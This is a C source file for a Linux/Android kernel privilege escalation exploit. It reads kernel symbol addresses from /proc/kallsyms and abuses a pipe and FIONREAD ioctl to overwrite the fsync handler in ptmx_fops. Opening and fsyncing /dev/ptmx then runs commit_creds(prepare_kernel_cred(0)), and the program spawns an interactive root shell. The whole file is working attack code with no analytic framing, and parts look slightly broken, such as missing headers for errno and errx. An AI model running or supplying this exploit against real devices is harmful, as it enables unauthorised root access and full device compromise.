#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>

#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define _LARGEFILE64_SOURCE
#define PTMX_DEVICE "/dev/ptmx"

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *);
int (*commit_creds)(struct cred *);


void pipe_write_address(unsigned int address,void * value){
	int fd[2];
	char data[4];
    char buf[255];
    buf[0]=0;
    int i;
	*(unsigned int *)&data = (unsigned int *)value;

	if (pipe(fd) < 0){
        printf("Unable to create pipe!\n");
    }
    
    for(i=0;i<2;i++)
    {  
    	if(data[i])
        write(fd[1], buf, data[i]);
       	ioctl(fd[0], FIONREAD, (void *)(address+i));
       	if(data[i])
       	read(fd[0], buf, sizeof(buf));
    
    }    

    close(fd[0]);
    close(fd[1]);
}


/* Find a kernel symbol in /proc/kallsyms */
static void *kallsyms_get_symbol_address(const char *symbol_name)
{
	FILE *fp;
	char function[BUFSIZ];
	char symbol;
	void *address;
	int ret;

	fp = fopen("/proc/kallsyms", "r");
	if (!fp) {
		printf("Failed to open /proc/kallsyms due to %s.", strerror(errno));
		return 0;
	}

	while(!feof(fp)) {
		ret = fscanf(fp, "%p %c %s", &address, &symbol, function);
		if (ret != 3) {
			break;
		}

		if (!strcmp(function, symbol_name)) {
			fclose(fp);
			return address;
		}
	}
	fclose(fp);

	return NULL;
}

/* This function will be executed in kernel mode. It has the effect of granting
 * this process root. */
void get_root(void) {
        commit_creds(prepare_kernel_cred(0));
        
}

static void run_obtain_root_privilege(void *user_data) {
	int fd;
	fd = open(PTMX_DEVICE, O_WRONLY);
	fsync(fd);
	close(fd);

}


void
pop_shell(void)
{	run_obtain_root_privilege(NULL);
	if (getuid() == 0) {
		system("/system/bin/sh -i");
	}else{
	errx(1, "failed to get root");
	}
}



void
map_kernel(void)
{
	prepare_kernel_cred	= kallsyms_get_symbol_address("prepare_kernel_cred");
	commit_creds		= kallsyms_get_symbol_address("commit_creds");


	printf("[+] prepare_kernel_cred: %p\n[+] commit_creds: %p\n", prepare_kernel_cred,
		commit_creds);
}


void overwrite_ptmx_fsync_address(void *value) {
	void * fops_address = kallsyms_get_symbol_address("ptmx_fops");
	unsigned int fsync_address = (unsigned int)fops_address + 0x38;
	pipe_write_address(fsync_address, value);

}


void exploit(void){
	map_kernel();
	overwrite_ptmx_fsync_address(&get_root);
	pop_shell();
}




int main(void)
{
	exploit();

	return 0;
}